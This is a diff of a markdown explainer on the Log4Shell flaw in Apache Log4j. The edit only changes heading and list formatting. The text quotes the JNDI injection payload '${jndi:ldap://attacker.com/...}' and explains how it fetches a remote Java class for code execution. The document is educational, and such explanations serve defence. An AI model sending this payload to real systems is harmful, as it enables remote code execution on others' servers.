@@ -13,9 +13,9 @@ Apache Log4j is a Java-based logging utility used in countless enterprise applic
 - **Fixed in:** 2.15.0 and later  
 - **Exploit Example:** `${jndi:ldap://attacker.com/payload}`
 
-#### How it Works – The Exploit:
--- Log4j supported JNDI (Java Naming and Directory Interface) lookups. An attacker could send a string like **${jndi:ldap://attacker.com/a}** in user input.
--- If this input is logged in a login error message, Log4j would parse the JNDI string. It would connect to the malicious LDAP server and fetch a remote Java class = Remote Code Execution (RCE).  
+### How it Works – The Exploit:
+- Log4j supported JNDI (Java Naming and Directory Interface) lookups. An attacker could send a string like **${jndi:ldap://attacker.com/a}** in user input.
+- If this input is logged in a login error message, Log4j would parse the JNDI string. It would connect to the malicious LDAP server and fetch a remote Java class = Remote Code Execution (RCE).  
 
 ---
 
